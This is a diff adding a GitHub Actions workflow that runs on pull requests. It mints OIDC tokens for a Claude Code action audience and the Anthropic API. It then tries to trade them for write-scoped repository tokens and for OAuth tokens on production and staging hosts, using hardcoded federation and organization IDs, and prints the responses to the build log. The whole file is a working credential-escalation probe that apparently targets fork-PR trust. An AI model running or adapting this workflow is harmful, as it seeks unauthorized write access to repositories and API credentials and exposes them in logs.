@@ -1,0 +1,33 @@
+name: wifprobe
+on: [pull_request]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: dual-door-forkpr
+        run: |
+          mint() { curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${1}"; }
+          claims() { echo "${1}" | cut -d. -f2 | python3 -c 'import sys,base64,json;d=sys.stdin.read().strip();print(json.dumps({k:v for k,v in json.loads(base64.urlsafe_b64decode(d+"="*(-len(d)%4))).items() if k in ("iss","sub","aud","ref_protected","repository_visibility","event_name")}))'; }
+          RAWA="$(mint claude-code-github-action)"
+          JA="$(echo "${RAWA}" | python3 -c 'import sys,json;t=sys.stdin.read().strip();print(json.loads(t).get("value") if t.startswith("{") else t)')"
+          echo "JA claims: $(claims "$JA")"
+          RAWB="$(mint https://api.anthropic.com)"
+          JB="$(echo "${RAWB}" | python3 -c 'import sys,json;t=sys.stdin.read().strip();print(json.loads(t).get("value") if t.startswith("{") else t)')"
+          echo "=== app-token-exchange (with perms) ==="
+          curl -sS -w '\nHTTP:%{http_code}\n' -X POST \
+            "https://api.anthropic.com/api/github/github-app-token-exchange" \
+            -H "Authorization: Bearer ${JA}" \
+            -H 'Content-Type: application/json' \
+            -d '{"permissions":{"contents":"write","issues":"write","pull_requests":"write"}}' | head -c 2500; echo
+          WIF="{\"grant_type\":\"urn:ietf:params:oauth:grant-type:jwt-bearer\",\"assertion\":\"${JB}\",\"federation_rule_id\":\"fdrl_011hMWTmS7U9FSTngD9ntfT6\",\"organization_id\":\"1ec12c5c-6542-4da8-bf2f-c15919aef01c\"}"
+          for HOST in api.anthropic.com api-staging.anthropic.com; do
+            echo "=== WIF @ ${HOST} ==="
+            RESP="$(curl -sS -w '\nHTTP:%{http_code}' "https://${HOST}/v1/oauth/token" \
+              -H 'Content-Type: application/json' \
+              -H 'anthropic-beta: oauth-2025-04-20,oidc-federation-2026-04-01' \
+              -d "$WIF")"
+            echo "${RESP}" | head -c 3000; echo
+          done
